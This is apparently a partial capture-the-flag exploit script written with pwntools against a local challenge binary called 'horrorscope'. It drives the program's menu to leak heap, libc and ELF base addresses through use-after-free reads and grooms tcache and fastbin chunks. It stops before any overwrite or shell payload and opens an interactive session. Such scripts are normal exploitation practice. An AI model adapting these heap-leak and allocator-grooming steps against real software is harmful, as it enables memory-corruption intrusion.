from pwn import *

p = process('./horrorscope')

gdb.attach(p, gdbscript="""
        b * print_cookie_fortune
        b * delete_cookie
        b * sign
        """)

def fillup_cookies():
    global p
    for _ in range(34):
        p.sendlineafter('> ',"2")

def view_cookie(idx):
    global p
    p.sendlineafter('> ','4')
    p.sendlineafter('> ',str(idx))
def create_cookie():
    global p 
    p.sendlineafter('> ',"2")

def ask_8ball(data,yeyney):
    global p
    p.sendlineafter('> ','1')
    p.sendlineafter('> ',data)
    p.sendlineafter('> ',yeyney)

def delete_cookie(idx):
    global p
    p.sendlineafter('> ',str(idx))

def view_fortune(idx):
    global p 
    p.sendlineafter('> ','3')
    p.sendlineafter('> ', str(idx))

def ftcache():
    global p
    for i in range(5,17,2):
        create_cookie()
        create_cookie()
        delete_cookie(i)

def delete_fortune():
    global p
    p.sendlineafter('> ','5')

def sign(data):
    global p
    p.sendlineafter('> ','0')
    p.sendlineafter('> ',data)

#ask_8ball('DDDDDDDD','Y')
fillup_cookies()
#delet cookies
delete_cookie(3)
view_cookie(3)
heap_leak = u64(p.recvline().replace('\n',"").ljust(8,'\0'))
heap_leak = heap_leak >> 0x8
heap_leak = heap_leak << 0xc
libc_leak = heap_leak + 0x102000
print("we_leaked: ",hex(heap_leak))
print('libc_base: ', hex(libc_leak))

create_cookie()
create_cookie()
delete_cookie(2)
ask_8ball('A'*0x56,'Y')
view_fortune(0)
p.recvline()
leak_elf = u64(p.recv(6).ljust(8,'\0'))
print('elf_base: ',hex(leak_elf))

ftcache()

create_cookie()
create_cookie()
delete_cookie(32)

delete_fortune()

#create_cookie()
create_cookie()
delete_cookie(32)

sign('AAAAAAAAAAAA')
view_cookie(32)
encrypted_fast_bin = u64(p.recvline().replace('\n',"").replace(' ',"").ljust(8,'\0'))
print('ecrypted_fast_bin: ',hex(encrypted_fast_bin))
view_cookie(10)
p.interactive()
